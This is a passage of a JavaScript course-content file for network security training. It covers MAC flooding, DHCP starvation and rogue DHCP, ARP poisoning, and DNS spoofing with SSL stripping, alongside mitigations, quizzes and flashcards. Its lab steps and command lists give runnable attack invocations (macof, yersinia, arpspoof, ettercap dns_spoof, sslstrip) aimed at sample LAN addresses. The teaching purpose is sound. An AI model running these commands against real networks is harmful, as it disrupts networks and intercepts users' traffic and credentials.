  sub: 'Understanding MAC flooding, CAM table overflow, and switch spoofing techniques.',
  objectives: ['Explain the function of a CAM table', 'Execute and mitigate MAC flooding attacks', 'Understand switch spoofing vulnerabilities'],
  learn: {
    simple: 'MAC attacks target the Layer 2 infrastructure, primarily switches. A switch uses a Content Addressable Memory (CAM) table to map MAC addresses to physical ports. Attackers manipulate this table to intercept traffic or bypass network segmentation.',
    analogy: 'Imagine a hotel receptionist (the switch) who keeps a list of which guest is in which room (CAM table). If someone creates thousands of fake reservations, the receptionist runs out of paper and just starts shouting messages to the whole lobby (hub behavior).',
    architecture: 'A MAC flooding attack bombards the switch with thousands of fake source MAC addresses. The CAM table, having limited memory, overflows. When the CAM table is full, the switch cannot learn new addresses and falls back to fail-open mode, broadcasting all incoming traffic to all ports (like a hub). This allows the attacker to passively sniff traffic meant for other users. Switch spoofing involves an attacker configuring their device to emulate a switch and negotiate a trunk link using Dynamic Trunking Protocol (DTP), gaining access to all VLANs.',
    why: 'Enterprise networks rely on switches for segmentation and security. If a switch is compromised via a MAC attack, attackers can bypass VLAN restrictions, capture sensitive data across the network, and launch further man-in-the-middle attacks.'
  },
  enterprise: {
    gfs: 'A malicious actor in a GFS visitor lounge could use MAC flooding to force the local switch into hub mode, capturing VoIP traffic and internal communications.',
    windows: 'Windows hosts are typically the victims of MAC attacks, as their traffic is broadcasted to the attacker. Network administrators must configure port security on switches to prevent Windows hosts from being spoofed.',
    linux: 'Linux tools like macof (part of the dsniff suite) are frequently used to generate the thousands of random MAC addresses required for a CAM table overflow attack.'
  },
  workflow: ['Step 1: Connect to the target switch network.', 'Step 2: Identify the switch behavior (e.g., VLANs, port security).', 'Step 3: Launch a MAC flooding tool (e.g., macof).', 'Step 4: Monitor the network traffic to see if the switch fails open.', 'Step 5: Capture the broadcasted traffic using a sniffer.', 'Step 6: Stop the attack to avoid prolonged network disruption.'],
  diagram: {
    caption: 'Click to interact with the diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect width="600" height="400" fill="#f8f9fa"/><text x="300" y="200" font-family="Arial" font-size="20" text-anchor="middle" fill="#333">MAC Attack Architecture</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'macof -i eth0', purpose: 'Flood the network with random MAC addresses', out: 'Thousands of packets sent rapidly', note: 'Can cause severe network degradation', mistake: 'Running without authorization can take down production networks' }
    ],
    win: [
      { cmd: 'Get-NetAdapterAdvancedProperty', purpose: 'View advanced NIC properties in Windows', out: 'List of NIC properties', note: 'Useful for checking if NIC is configured for specific VLANs', mistake: 'Modifying properties without understanding can break connectivity' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Intermediate',
    duration: '45',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['macof', 'Wireshark'],
    dependencies: [],
    safety: ['Perform this lab only in an isolated environment.'],
    scenario: 'GFS wants to test the resilience of their edge switches against CAM overflow attacks.',
    objectives: ['Demonstrate a CAM table overflow and capture resulting traffic'],
    steps: ['Step 1: Start Wireshark on the attacker machine.', 'Step 2: Run `macof -i eth0` for 10 seconds.', 'Step 3: Observe the flood of random MAC addresses in Wireshark.', 'Step 4: Stop macof.', 'Step 5: Check if traffic from other hosts is now visible in Wireshark.'],
    evidence: ['Screenshot of macof running and Wireshark capturing broadcasted unicast traffic.'],
    validation: ['You should see: Unicast traffic intended for other devices being captured by the attacker.'],
    troubleshooting: ['If the switch does not fail open, it may have port security enabled or a very large CAM table.'],
    mitre: [{ id: 'T1498', name: 'Network Denial of Service', tactic: 'Impact' }],
    cleanup: ['Stop macof and clear the switch CAM table (requires switch admin access).']
  },
  quiz: [
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is the primary target of a MAC flooding attack?', opts: ['The router\'s routing table', 'The switch\'s CAM table', 'The DHCP server\'s lease table', 'The victim\'s ARP cache'], correct: 1, fb: 'MAC flooding targets the switch\'s Content Addressable Memory (CAM) table.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What happens when a switch\'s CAM table is full?', opts: ['It shuts down all ports', 'It routes traffic to the default gateway', 'It broadcasts all incoming frames to all ports', 'It drops all incoming frames'], correct: 2, fb: 'When full, a switch typically "fails open," behaving like a hub and broadcasting traffic.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which tool is commonly used to perform a MAC flooding attack?', opts: ['Nmap', 'macof', 'Metasploit', 'Burp Suite'], correct: 1, fb: 'macof, part of the dsniff suite, is designed specifically for MAC flooding.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'How can a network administrator mitigate MAC flooding?', opts: ['Disable ARP', 'Enable Port Security', 'Use WEP encryption', 'Disable DHCP'], correct: 1, fb: 'Port Security limits the number of MAC addresses allowed on a single switch port.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What protocol is exploited in a Switch Spoofing attack?', opts: ['STP', 'VTP', 'DTP', 'ARP'], correct: 2, fb: 'Dynamic Trunking Protocol (DTP) is exploited to negotiate a trunk link.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is the result of a successful switch spoofing attack?', opts: ['Denial of service', 'Access to all VLANs configured on the switch', 'Bypassing the firewall', 'Cracking Wi-Fi passwords'], correct: 1, fb: 'By negotiating a trunk link, the attacker gains access to traffic from all VLANs.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'True or False: A MAC address is a logical address that can be easily changed.', opts: ['True', 'False'], correct: 0, fb: 'True. While burned into hardware, MAC addresses can be easily spoofed in software.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which mitigation prevents an attacker from negotiating a trunk link?', opts: ['switchport mode access', 'spanning-tree portfast', 'ip dhcp snooping', 'arp inspection'], correct: 0, fb: 'Setting a port to "switchport mode access" disables DTP negotiation.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'In a MAC flooding attack, what type of frames are sent?', opts: ['Frames with identical source MAC addresses', 'Frames with random source MAC addresses', 'Frames with broadcast destination MAC addresses', 'Frames with multicast destination MAC addresses'], correct: 1, fb: 'Random source MAC addresses are used to quickly fill up the CAM table.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What does CAM stand for in networking?', opts: ['Centralized Access Management', 'Content Addressable Memory', 'Computer Aided Monitoring', 'Control and Monitoring'], correct: 1, fb: 'CAM stands for Content Addressable Memory.' }
  ],
  flashcards: [
    { f: 'CAM Table', b: 'Content Addressable Memory table; stores the MAC address-to-port mappings on a switch.' },
    { f: 'MAC Flooding', b: 'An attack that overloads the CAM table with fake MAC addresses, forcing the switch to broadcast traffic.' },
    { f: 'Switch Spoofing', b: 'An attacker mimics a switch using DTP to form a trunk link and gain access to multiple VLANs.' }
  ],
  summary: ['MAC attacks exploit Layer 2 switch functionalities.', 'MAC flooding fills the CAM table, causing hub-like behavior.', 'macof is a common tool for MAC flooding.', 'Switch spoofing uses DTP to gain VLAN access.', 'Port security is the primary mitigation for MAC attacks.'],
  outcomes: ['Understand the mechanics of a CAM table.', 'Perform a simulated MAC flooding attack.', 'Implement mitigation strategies for MAC attacks.'],
  meta: { contentVersion: "1.0.0", estimatedTime: 45, difficulty: "Intermediate", prerequisites: [], lastReviewed: "2026-07-18" }
};

CONTENT['dhcp-attacks'] = {
  eyebrow: 'Module 08 · Topic 3',
  title: 'DHCP Attacks',
  module: 'Phase 08: Network Security Analyst',
  sub: 'Exploring DHCP starvation and rogue DHCP server deployments.',
  objectives: ['Understand the DHCP DORA process', 'Execute DHCP starvation attacks', 'Identify the risks of rogue DHCP servers'],
  learn: {
    simple: 'Dynamic Host Configuration Protocol (DHCP) assigns IP addresses to devices on a network. Attackers can exploit DHCP through Starvation attacks (exhausting all available IP addresses) or by setting up a Rogue DHCP server (assigning malicious IP settings to clients).',
    analogy: 'Think of DHCP as a coat check. DHCP starvation is like an attacker bringing 1,000 fake coats to take up all the hangers, so legitimate guests cannot check their coats. A rogue DHCP server is like a fake coat check attendant who steals coats instead of storing them.',
    architecture: 'The DHCP process involves four steps: Discover, Offer, Request, Acknowledge (DORA). In a DHCP Starvation attack, the attacker broadcasts thousands of DHCP Discover messages with spoofed MAC addresses. The legitimate DHCP server responds with Offers, depleting its IP pool. Once the legitimate server is exhausted, the attacker can introduce a Rogue DHCP server. This rogue server responds to new Discover requests, providing an IP address along with a malicious Default Gateway and DNS server, enabling Man-in-the-Middle (MitM) attacks.',
    why: 'In an enterprise, a rogue DHCP server can redirect all traffic from newly connected clients to an attacker-controlled machine, allowing for silent interception of credentials and data injection.'
  },
  enterprise: {
    gfs: 'If an attacker plugs a rogue access point with a DHCP server into a GFS conference room, they could intercept all web traffic from employees connecting to that AP.',
    windows: 'Windows Server provides DHCP services. Administrators must monitor event logs for IP pool exhaustion (Event ID 1020) to detect starvation attacks.',
    linux: 'Attackers frequently use tools like Yersinia on Linux to launch DHCP starvation attacks and execute rogue DHCP server scripts using dnsmasq.'
  },
  workflow: ['Step 1: Connect to the target network.', 'Step 2: Launch a DHCP starvation tool (e.g., Yersinia).', 'Step 3: Monitor the DHCP server to confirm IP pool exhaustion.', 'Step 4: Start a rogue DHCP server on the attacker machine.', 'Step 5: Wait for new clients to request IP addresses.', 'Step 6: Intercept and analyze traffic routed through the rogue gateway.'],
  diagram: {
    caption: 'Click to interact with the diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect width="600" height="400" fill="#f8f9fa"/><text x="300" y="200" font-family="Arial" font-size="20" text-anchor="middle" fill="#333">DHCP Attack Process (DORA)</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'yersinia dhcp -attack 1 -interface eth0', purpose: 'Launch DHCP starvation attack', out: 'Thousands of DHCP Discover packets sent', note: 'Use with caution on live networks', mistake: 'Attacking the wrong interface' }
    ],
    win: [
      { cmd: 'ipconfig /release && ipconfig /renew', purpose: 'Request a new DHCP lease', out: 'New IP address assigned', note: 'Useful for testing DHCP functionality', mistake: 'Doing this on a remote server will disconnect your session' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Intermediate',
    duration: '45',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['Yersinia', 'dnsmasq'],
    dependencies: [],
    safety: ['Perform this lab only in an isolated environment.'],
    scenario: 'GFS needs to validate if DHCP Snooping is properly configured on their access switches.',
    objectives: ['Perform DHCP starvation and deploy a rogue DHCP server'],
    steps: ['Step 1: Open Yersinia in graphical mode (`yersinia -G`).', 'Step 2: Select the DHCP tab and launch a "sending DISCOVER packet" attack.', 'Step 3: Verify the legitimate DHCP pool is exhausted.', 'Step 4: Configure and start `dnsmasq` to act as a rogue DHCP server.', 'Step 5: Connect a new client to the network and verify it receives the rogue IP settings.'],
    evidence: ['Screenshot of the client receiving IP settings from the rogue DHCP server.'],
    validation: ['You should see: The client\'s default gateway points to the attacker\'s IP address.'],
    troubleshooting: ['If starvation fails, the switch may have DHCP rate limiting or port security enabled.'],
    mitre: [{ id: 'T1557', name: 'Adversary-in-the-Middle', tactic: 'Credential Access' }],
    cleanup: ['Stop Yersinia, stop dnsmasq, and restart the legitimate DHCP service.']
  },
  quiz: [
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What does the acronym DORA stand for in DHCP?', opts: ['Discover, Offer, Route, Acknowledge', 'Discover, Offer, Request, Acknowledge', 'Data, Output, Request, Allocate', 'Domain, Origin, Route, Access'], correct: 1, fb: 'DORA stands for Discover, Offer, Request, Acknowledge.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is the primary goal of a DHCP starvation attack?', opts: ['To crash the DHCP server', 'To exhaust the DHCP server\'s IP address pool', 'To spoof the DNS server', 'To bypass the firewall'], correct: 1, fb: 'DHCP starvation aims to deplete the available IP addresses so legitimate clients cannot get one.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which tool is famous for exploiting DHCP, STP, and CDP vulnerabilities?', opts: ['Nmap', 'Metasploit', 'Yersinia', 'Hydra'], correct: 2, fb: 'Yersinia is a network vulnerability tool designed for Layer 2 protocols like DHCP, STP, and CDP.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What does an attacker typically do immediately after a successful DHCP starvation attack?', opts: ['Launch a DoS attack', 'Set up a Rogue DHCP server', 'Format the victim\'s hard drive', 'Exfiltrate database records'], correct: 1, fb: 'Once the legitimate server is exhausted, the attacker introduces a Rogue DHCP server to assign malicious settings.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which DHCP setting is manipulated by a rogue server to perform a Man-in-the-Middle attack?', opts: ['Subnet Mask', 'Default Gateway', 'Lease Time', 'MAC Address'], correct: 1, fb: 'By setting the Default Gateway to the attacker\'s IP, all off-subnet traffic is routed through the attacker.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'How can a switch prevent rogue DHCP servers?', opts: ['Port Security', 'MAC Filtering', 'DHCP Snooping', 'ARP Inspection'], correct: 2, fb: 'DHCP Snooping configures switch ports as trusted (for legitimate DHCP servers) or untrusted, blocking rogue offers.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'True or False: A DHCP Discover message is sent as a unicast packet.', opts: ['True', 'False'], correct: 1, fb: 'False. A DHCP Discover message is broadcasted to find available DHCP servers.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'In the DORA process, who sends the DHCP Offer?', opts: ['The Client', 'The Router', 'The DHCP Server', 'The Switch'], correct: 2, fb: 'The DHCP Server sends the Offer in response to a Client\'s Discover message.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What type of packet does a DHCP Starvation attack flood the network with?', opts: ['DHCP Release', 'DHCP Request', 'DHCP Offer', 'DHCP Discover'], correct: 3, fb: 'The attack floods the network with DHCP Discover packets using spoofed MAC addresses.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which defense mechanism relies on DHCP Snooping to prevent ARP spoofing?', opts: ['Dynamic ARP Inspection (DAI)', 'IP Source Guard', 'Port Security', 'VLAN Access Control Lists (VACLs)'], correct: 0, fb: 'DAI uses the DHCP Snooping binding database to validate ARP packets.' }
  ],
  flashcards: [
    { f: 'DORA', b: 'The four-step DHCP process: Discover, Offer, Request, Acknowledge.' },
    { f: 'DHCP Starvation', b: 'An attack that exhausts the IP address pool of a DHCP server by flooding it with spoofed Discover requests.' },
    { f: 'Rogue DHCP Server', b: 'An unauthorized DHCP server placed on a network to assign malicious IP configurations to clients.' }
  ],
  summary: ['DHCP assigns IP configurations using the DORA process.', 'DHCP starvation depletes the IP pool using fake MAC addresses.', 'Rogue DHCP servers assign malicious default gateways for MitM.', 'Yersinia is a primary tool for DHCP attacks.', 'DHCP Snooping is the best defense against DHCP attacks.'],
  outcomes: ['Explain the DORA process.', 'Execute a DHCP starvation attack.', 'Configure mitigations against rogue DHCP servers.'],
  meta: { contentVersion: "1.0.0", estimatedTime: 45, difficulty: "Intermediate", prerequisites: [], lastReviewed: "2026-07-18" }
};

CONTENT['arp-poisoning'] = {
  eyebrow: 'Module 08 · Topic 4',
  title: 'ARP Poisoning',
  module: 'Phase 08: Network Security Analyst',
  sub: 'Executing ARP spoofing, Man-in-the-Middle (MitM) attacks, and Gratuitous ARP manipulation.',
  objectives: ['Understand Address Resolution Protocol (ARP) operations', 'Execute ARP poisoning attacks', 'Analyze MitM traffic'],
  learn: {
    simple: 'Address Resolution Protocol (ARP) maps IP addresses to MAC addresses on a local network. ARP Poisoning (or Spoofing) involves sending forged ARP responses to a victim, tricking them into believing the attacker\'s MAC address is associated with the IP address of the default gateway or another victim.',
    analogy: 'Imagine a physical address book in an office. If an attacker crosses out the CEO\'s real room number and writes in their own room number, all mail meant for the CEO goes to the attacker. This is ARP poisoning.',
    architecture: 'ARP is a stateless protocol; devices will accept ARP replies even if they did not send an ARP request (this is called a Gratuitous ARP). In a typical ARP spoofing MitM attack, the attacker sends an ARP reply to the victim (claiming to be the router) and an ARP reply to the router (claiming to be the victim). Both devices update their ARP caches, routing traffic through the attacker. IP Forwarding must be enabled on the attacker\'s machine so traffic is passed along, otherwise, it results in a Denial of Service (DoS).',
    why: 'ARP spoofing is the most common method for achieving a Man-in-the-Middle position on a local enterprise network, allowing attackers to intercept credentials, modify data in transit, or downgrade encrypted connections.'
  },
  enterprise: {
    gfs: 'If an attacker compromises a workstation in the GFS accounting department, they could use ARP poisoning to intercept traffic between other accountants and the internal financial database server.',
    windows: 'Windows clients cache ARP entries dynamically. Administrators can use Group Policy to configure static ARP entries for critical servers, though this is difficult to maintain at scale.',
    linux: 'Linux attackers use tools like `arpspoof` or `ettercap`. It is crucial that the attacker enables IP forwarding (`sysctl -w net.ipv4.ip_forward=1`) to act as a router and avoid dropping the intercepted packets.'
  },
  workflow: ['Step 1: Identify the IP of the victim and the default gateway.', 'Step 2: Enable IP forwarding on the attacker machine.', 'Step 3: Launch the ARP poisoning tool targeting the victim and gateway.', 'Step 4: Use a sniffer (e.g., Wireshark) to capture the intercepted traffic.', 'Step 5: Optionally, use tools to modify the traffic in real-time.', 'Step 6: Stop the attack and restore the original ARP tables (re-arping).'],
  diagram: {
    caption: 'Click to interact with the diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect width="600" height="400" fill="#f8f9fa"/><text x="300" y="200" font-family="Arial" font-size="20" text-anchor="middle" fill="#333">ARP Poisoning & MitM Flow</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'arpspoof -i eth0 -t 192.168.1.10 192.168.1.1', purpose: 'ARP Poisoning', out: 'Redirected traffic', note: 'Requires IP forwarding enabled', mistake: 'Not enabling IP forwarding causes a DoS instead of MITM' },
      { cmd: 'echo 1 > /proc/sys/net/ipv4/ip_forward', purpose: 'Enable IP forwarding in Linux', out: 'Silent success', note: 'Essential for MitM', mistake: 'Forgetting this step breaks the victim\'s internet connection' }
    ],
    win: [
      { cmd: 'arp -a', purpose: 'Check ARP cache', out: 'List of IPs and MACs', note: 'Useful for detecting ARP poisoning', mistake: 'Ignoring static ARP entries' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Intermediate',
    duration: '45',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['arpspoof', 'Wireshark'],
    dependencies: [],
    safety: ['Perform this lab only in an isolated environment.'],
    scenario: 'GFS SOC analysts need to understand how to detect ARP poisoning attacks on the network.',
    objectives: ['Execute an ARP spoofing attack and capture traffic'],
    steps: ['Step 1: Enable IP forwarding on the attacker Kali machine.', 'Step 2: Run `arpspoof -i eth0 -t <VICTIM_IP> <GATEWAY_IP>`.', 'Step 3: Run `arpspoof -i eth0 -t <GATEWAY_IP> <VICTIM_IP>` in a new terminal.', 'Step 4: Open Wireshark and capture traffic from the victim.', 'Step 5: Stop the arpspoof processes to restore the network.'],
    evidence: ['Screenshot of the victim\'s ARP table showing the attacker\'s MAC address for the Gateway IP.'],
    validation: ['You should see: The victim\'s traffic passing through the attacker\'s Wireshark interface.'],
    troubleshooting: ['If the victim loses internet access, verify IP forwarding is enabled on the attacker machine.'],
    mitre: [{ id: 'T1557', name: 'Adversary-in-the-Middle', tactic: 'Credential Access' }],
    cleanup: ['Stop arpspoof tools and clear the ARP cache on the victim machine.']
  },
  quiz: [
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is the purpose of the ARP protocol?', opts: ['To resolve domain names to IP addresses', 'To route packets between different networks', 'To resolve IP addresses to MAC addresses', 'To assign IP addresses to clients'], correct: 2, fb: 'ARP (Address Resolution Protocol) maps Layer 3 IP addresses to Layer 2 MAC addresses.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Why is ARP inherently vulnerable to spoofing?', opts: ['It does not use encryption', 'It is a stateless protocol that accepts unsolicited replies', 'It operates at Layer 3', 'It uses UDP for communication'], correct: 1, fb: 'ARP is stateless; devices will update their cache with unsolicited ARP replies (Gratuitous ARP) without authentication.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'In a Man-in-the-Middle attack via ARP spoofing, what must the attacker do to ensure the victim does not lose network connectivity?', opts: ['Disable the firewall', 'Enable IP Forwarding', 'Run a DHCP server', 'Change their MAC address'], correct: 1, fb: 'IP forwarding allows the attacker\'s machine to route the intercepted packets to their true destination.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which command displays the ARP cache on a Windows machine?', opts: ['ipconfig /all', 'route print', 'arp -a', 'netstat -nr'], correct: 2, fb: 'The `arp -a` command displays the current ARP cache in Windows.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is a Gratuitous ARP?', opts: ['An ARP request sent to a different subnet', 'An unsolicited ARP reply used to update ARP caches', 'An encrypted ARP message', 'An ARP message sent to the default gateway'], correct: 1, fb: 'A Gratuitous ARP is an ARP response that was not prompted by an ARP request, often used for failover or spoofing.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which tool is commonly used to perform ARP poisoning?', opts: ['Nmap', 'arpspoof', 'John the Ripper', 'Hydra'], correct: 1, fb: 'arpspoof (part of dsniff) is a classic tool for ARP poisoning.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'How can a network mitigate ARP poisoning?', opts: ['Implementing Dynamic ARP Inspection (DAI)', 'Disabling the switch CAM table', 'Using WEP encryption', 'Disabling DHCP'], correct: 0, fb: 'DAI validates ARP packets against the DHCP Snooping binding database, dropping invalid ones.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'If an attacker performs ARP spoofing but forgets to enable IP forwarding, what is the result?', opts: ['Man-in-the-Middle', 'Denial of Service (DoS)', 'DNS Spoofing', 'MAC Flooding'], correct: 1, fb: 'Without IP forwarding, the packets are dropped by the attacker, resulting in a DoS for the victim.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'True or False: ARP poisoning can be performed across different VLANs by default.', opts: ['True', 'False'], correct: 1, fb: 'False. ARP is a Layer 2 protocol and is confined to the local broadcast domain (VLAN).' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which file must be modified in Linux to enable IP forwarding?', opts: ['/etc/hosts', '/etc/resolv.conf', '/proc/sys/net/ipv4/ip_forward', '/etc/network/interfaces'], correct: 2, fb: 'Writing a \'1\' to `/proc/sys/net/ipv4/ip_forward` enables IP forwarding in Linux.' }
  ],
  flashcards: [
    { f: 'ARP', b: 'Address Resolution Protocol; maps IP addresses to MAC addresses.' },
    { f: 'Gratuitous ARP', b: 'An unsolicited ARP reply used to update the ARP caches of devices on the network.' },
    { f: 'Dynamic ARP Inspection (DAI)', b: 'A security feature that validates ARP packets and drops invalid IP-to-MAC bindings to prevent spoofing.' }
  ],
  summary: ['ARP maps IPs to MAC addresses.', 'ARP is stateless and vulnerable to forged replies.', 'ARP poisoning redirects traffic to the attacker (MitM).', 'IP forwarding is crucial to avoid causing a DoS during MitM.', 'DAI is the primary enterprise defense against ARP spoofing.'],
  outcomes: ['Understand ARP vulnerabilities.', 'Execute an ARP poisoning attack.', 'Implement DAI to secure the network.'],
  meta: { contentVersion: "1.0.0", estimatedTime: 45, difficulty: "Intermediate", prerequisites: [], lastReviewed: "2026-07-18" }
};

CONTENT['spoofing-mitm'] = {
  eyebrow: 'Module 08 · Topic 5',
  title: 'Spoofing & MitM Attacks',
  module: 'Phase 08: Network Security Analyst',
  sub: 'Advanced Man-in-the-Middle techniques: DNS spoofing, cache poisoning, and SSL stripping.',
  objectives: ['Execute DNS spoofing to redirect traffic', 'Understand DNS cache poisoning mechanics', 'Perform SSL stripping to downgrade secure connections'],
  learn: {
    simple: 'Once a Man-in-the-Middle (MitM) position is established (e.g., via ARP poisoning), attackers can manipulate higher-layer protocols. DNS Spoofing provides fake IP addresses for domain names, redirecting users to malicious sites. SSL Stripping downgrades secure HTTPS connections to unencrypted HTTP.',
    analogy: 'DNS spoofing is like changing the phonebook so the bank\'s name points to the attacker\'s phone number. SSL stripping is like the attacker answering the phone, telling the user "we don\'t need a secure line," and then relaying the messages to the real bank over a secure line, acting as a translator.',
    architecture: 'In DNS Spoofing, the attacker intercepts a DNS request and sends a forged response before the legitimate DNS server can reply. Cache poisoning involves tricking a DNS server itself into caching the forged record, affecting all its clients. SSL Stripping (e.g., using sslstrip) works by intercepting HTTP traffic and replacing all `https://` links with `http://`. The attacker maintains an HTTPS connection with the legitimate server but provides a plaintext HTTP connection to the victim, capturing credentials in the process. HSTS (HTTP Strict Transport Security) was developed to prevent SSL stripping.',
    why: 'These attacks allow threat actors to bypass encryption and steal credentials for critical enterprise applications (O365, internal portals) even if the user attempts to visit the legitimate domain.'
  },
  enterprise: {
    gfs: 'An attacker targeting GFS could use DNS spoofing to redirect employees trying to access the internal HR portal (hr.gfs.local) to a fake phishing page hosted on the attacker\'s machine.',
    windows: 'Windows DNS servers can be targets for cache poisoning. Enabling DNSSEC is crucial for enterprises to ensure the cryptographic integrity of DNS responses.',
    linux: 'Linux-based tools like Ettercap and Bettercap are widely used for performing combined ARP poisoning, DNS spoofing, and SSL stripping attacks in a single framework.'
  },
  workflow: ['Step 1: Achieve MitM (e.g., via ARP poisoning).', 'Step 2: Configure the DNS spoofing tool with the target domain and malicious IP.', 'Step 3: Launch the DNS spoofing tool.', 'Step 4: (For SSL Stripping) Configure iptables to route HTTP traffic to the SSL stripping tool.', 'Step 5: Run the SSL stripping tool (e.g., sslstrip).', 'Step 6: Monitor the captured traffic for credentials.'],
  diagram: {
    caption: 'Click to interact with the diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect width="600" height="400" fill="#f8f9fa"/><text x="300" y="200" font-family="Arial" font-size="20" text-anchor="middle" fill="#333">SSL Stripping & DNS Spoofing</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /192.168.1.10// /192.168.1.1//', purpose: 'ARP Poisoning and DNS Spoofing', out: 'Intercepted and redirected traffic', note: 'Requires editing etter.dns file first', mistake: 'Not configuring the etter.dns file results in no spoofing' },
      { cmd: 'sslstrip -l 8080', purpose: 'Run SSL strip on port 8080', out: 'Listens for traffic', note: 'Requires iptables port redirection', mistake: 'Forgetting iptables rule means traffic won\'t hit sslstrip' }
    ],
    win: [
      { cmd: 'ipconfig /displaydns', purpose: 'View the DNS resolver cache', out: 'List of cached DNS records', note: 'Useful to verify if DNS has been spoofed/poisoned', mistake: 'Misinterpreting legitimate records as spoofed' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Advanced',
    duration: '60',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['Ettercap', 'Bettercap', 'sslstrip'],
    dependencies: [],
    safety: ['Perform this lab only in an isolated environment.'],
    scenario: 'GFS requires testing against advanced MitM attacks to validate their HSTS and DNSSEC configurations.',
    objectives: ['Perform DNS spoofing and SSL stripping using Ettercap/Bettercap'],
    steps: ['Step 1: Edit `/etc/ettercap/etter.dns` to map a target domain to the attacker\'s IP.', 'Step 2: Start Apache on Kali to host a fake login page.', 'Step 3: Run Ettercap with the `dns_spoof` plugin.', 'Step 4: On the victim machine, ping the target domain and verify the IP resolves to the attacker.', 'Step 5: Access the domain in a browser and verify the fake page loads.'],
    evidence: ['Screenshot of the victim pinging the spoofed domain, showing the attacker IP.'],
    validation: ['You should see: DNS queries for the target domain resolving to the attacker\'s machine.'],
    troubleshooting: ['If the victim browser shows a certificate error, HSTS is likely blocking the SSL strip attempt.'],
    mitre: [{ id: 'T1557', name: 'Adversary-in-the-Middle', tactic: 'Credential Access' }],
    cleanup: ['Stop Ettercap, flush the victim\'s DNS cache (`ipconfig /flushdns`), and stop Apache.']
  },
  quiz: [
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is the primary objective of DNS Spoofing?', opts: ['To crash the DNS server', 'To redirect a user to a malicious website by providing a fake IP address', 'To encrypt DNS traffic', 'To bypass firewall rules'], correct: 1, fb: 'DNS spoofing provides a fraudulent IP address for a legitimate domain name.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'How does SSL Stripping work?', opts: ['It cracks the SSL certificate', 'It steals the private key of the server', 'It downgrades HTTPS links to HTTP, acting as a proxy between the victim and server', 'It exploits vulnerabilities in TLS 1.3'], correct: 2, fb: 'SSL stripping intercepts traffic and changes `https://` references to `http://`, forcing the victim to communicate in plaintext.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which security mechanism is designed specifically to prevent SSL Stripping?', opts: ['DNSSEC', 'HSTS (HTTP Strict Transport Security)', 'IPsec', 'MAC Filtering'], correct: 1, fb: 'HSTS instructs browsers to only connect to the site using HTTPS, ignoring any HTTP links.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'In an Ettercap DNS spoofing attack, which file must be modified to map domains to IPs?', opts: ['/etc/hosts', '/etc/resolv.conf', 'etter.dns', 'etter.conf'], correct: 2, fb: 'The `etter.dns` file contains the records used by Ettercap\'s dns_spoof plugin.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is DNS Cache Poisoning?', opts: ['Infecting the victim\'s browser cache', 'Corrupting the DNS server\'s cache with forged records so it serves them to multiple clients', 'Deleting the DNS cache', 'Encrypting the DNS cache'], correct: 1, fb: 'Cache poisoning targets the DNS resolver itself, affecting all users who query that resolver.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which tool is famous for automating SSL Stripping?', opts: ['Nmap', 'sslstrip (by Moxie Marlinspike)', 'Hydra', 'John the Ripper'], correct: 1, fb: 'sslstrip was created by Moxie Marlinspike to automate this MitM attack.' },
